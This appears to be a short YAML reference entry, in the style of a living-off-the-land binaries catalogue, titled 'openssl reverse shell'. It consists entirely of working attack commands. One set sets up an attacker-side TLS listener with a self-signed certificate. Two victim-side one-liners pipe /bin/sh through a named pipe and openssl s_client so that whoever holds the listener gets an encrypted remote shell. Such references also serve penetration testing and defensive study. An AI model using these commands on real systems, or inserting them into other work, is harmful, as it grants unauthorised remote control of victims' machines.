---
functions:
  shell:
    - description: openssl reverse shell
      code: |
        
        Server (Attacker):
        openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj '/' -batch
        openssl s_server -quiet -key key.pem -cert cert.pem -port 9999

        Reverse Shell (Victim):
        rm -f /tmp/s; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:9999 > /tmp/s; rm /tmp/s
        rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|openssl s_client -quiet -connect 127.0.0.1:9999 >/tmp/f
---
